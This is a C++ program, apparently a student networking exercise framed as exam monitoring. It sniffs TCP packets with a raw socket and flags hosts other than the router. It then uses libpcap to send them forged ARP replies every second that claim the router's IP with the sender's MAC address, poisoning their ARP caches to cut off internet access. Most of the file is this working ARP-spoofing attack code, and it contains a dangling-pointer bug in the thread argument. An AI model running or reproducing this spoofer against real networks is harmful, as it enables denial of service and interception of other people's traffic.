#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/un.h>
#include <poll.h>
#include <sys/wait.h>
#include <sys/shm.h>
#include <bits/stdc++.h>
#include <pcap.h>
#define BUF_LEN 65000

using namespace std;

// assuming my router ip address is 
const char* routerIp = "192.168.1.1"; 
const char* myMacAddress = "40:1C:83:A8:F1:79"; 

void * blockinternet (void * args)
{
    const char * targetIp = (const char *)args;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle;

    // Open the network interface for packet capture
    handle = pcap_open_live("wlp0s20f3" , BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "Error opening interface: " << errbuf << std::endl;
        return NULL;
    }

    // Prepare ARP reply packet
    struct ethhdr {
        uint8_t destMac[6];
        uint8_t srcMac[6];
        uint16_t type;
    };

    struct arphdr {
        uint16_t htype;
        uint16_t ptype;
        uint8_t hlen;
        uint8_t plen;
        uint16_t operation;
        uint8_t senderMac[6];
        uint8_t senderIp[4];
        uint8_t targetMac[6];
        uint8_t targetIp[4];
    };

    ethhdr ethHeader{};
    arphdr arpHeader{};

    // Set Ethernet header
    sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ethHeader.destMac[0], &ethHeader.destMac[1],
           &ethHeader.destMac[2], &ethHeader.destMac[3], &ethHeader.destMac[4], &ethHeader.destMac[5]);
    sscanf(myMacAddress, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ethHeader.srcMac[0], &ethHeader.srcMac[1],
           &ethHeader.srcMac[2], &ethHeader.srcMac[3], &ethHeader.srcMac[4], &ethHeader.srcMac[5]);
    ethHeader.type = htons(0x0806); // ARP type

    // Set ARP header
    arpHeader.htype = htons(1); // Ethernet
    arpHeader.ptype = htons(0x0800); // IPv4
    arpHeader.hlen = 6; // MAC address length
    arpHeader.plen = 4; // IPv4 address length
    arpHeader.operation = htons(2); // ARP reply
    sscanf(myMacAddress, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arpHeader.senderMac[0], &arpHeader.senderMac[1],
           &arpHeader.senderMac[2], &arpHeader.senderMac[3], &arpHeader.senderMac[4], &arpHeader.senderMac[5]);
    inet_pton(AF_INET, routerIp, arpHeader.senderIp);
    sscanf("ff:ff:ff:ff:ff:ff", "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &arpHeader.targetMac[0], &arpHeader.targetMac[1],
           &arpHeader.targetMac[2], &arpHeader.targetMac[3], &arpHeader.targetMac[4], &arpHeader.targetMac[5]);
    inet_pton(AF_INET, targetIp, arpHeader.targetIp);

    while (true) 
    {
        uint8_t packet[sizeof(ethhdr) + sizeof(arphdr)];
        memcpy(packet, &ethHeader, sizeof(ethhdr));
        memcpy(packet + sizeof(ethhdr), &arpHeader, sizeof(arphdr));

        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            std::cerr << "Error sending ARP reply: " << pcap_geterr(handle) << std::endl;
        }

        // Sleep for a short duration before sending the next ARP reply
        sleep(1); 
    }
    pcap_close(handle);
}

// Function to check if the source IP is authorized
bool isAuthorized(const char* sourceIP) 
{
    return (strcmp(sourceIP, "192.168.1.1") == 0);
}

int main ()
{
    // capture tcp packets 
    int rsfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (rsfd == -1) 
    {
        cerr << "Error in creating raw socket" << endl;
        return 0;
    }
    int cnt = 0;
    const size_t headerSize = 20 + 8;

    int t = 10; //assuming 5 questions are there in total , and each communication captures 2 packets 
    while (t--) 
    {
        char buf[BUF_LEN];
        struct sockaddr_in client;
        socklen_t clilen = sizeof(client);

        ssize_t bytesRead = recvfrom(rsfd, buf, sizeof(buf), 0, (struct sockaddr*)&client, &clilen); // recieve packets ...

        if (bytesRead < 0) 
        {
            perror("recvfrom error");
            close(rsfd);
            return 1;
        }

        // Extract source IP address
        char sourceIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(client.sin_addr), sourceIP, sizeof(sourceIP));

        // Check if the source IP is not authorized (it does not belongs to router) , then find friend's ip at the second packet capture .
        if (t%2==1 && !isAuthorized(sourceIP)) 
        {
            cout << "Unauthorized access from source IP: " << sourceIP << endl;
            cnt++;
            t++;
            string srcip (sourceIP);
            pthread_t newt;
            pthread_create(&newt , NULL , blockinternet , (void *)srcip.c_str());
        } 
    }


    // after completion of question/answer (OT exam) , process I sends the cnt to mncr ...
    int sfdless = socket(AF_INET , SOCK_DGRAM , 0);
    if (sfdless==-1)
    {
        cout<<"Error in creating socket"<<endl;
        return 0;
    }

    struct sockaddr_in serveraddress;
    serveraddress.sin_family = AF_INET;
    serveraddress.sin_port = htons(9999);
    serveraddress.sin_addr.s_addr = inet_addr("127.0.0.1");

    // send cnt to mncr ...
    string ss = to_string(cnt);
    const char * buf = ss.c_str();
    int n = sendto(sfdless , buf , strlen(buf)+1 , 0 , (struct sockaddr *)&serveraddress , sizeof(serveraddress));
    cout<<"Sended counts to mncr "<<endl;

    // recieve response from mncr ...
    char buffer[100];
    socklen_t client_len = sizeof(serveraddress);
    n = recvfrom(sfdless , &buffer , sizeof(buffer)-1 , 0 , (struct sockaddr *)&serveraddress , &client_len);
    buffer[n] = '\0';
    cout<<"Recieved response from mncr "<<buffer<<endl;
}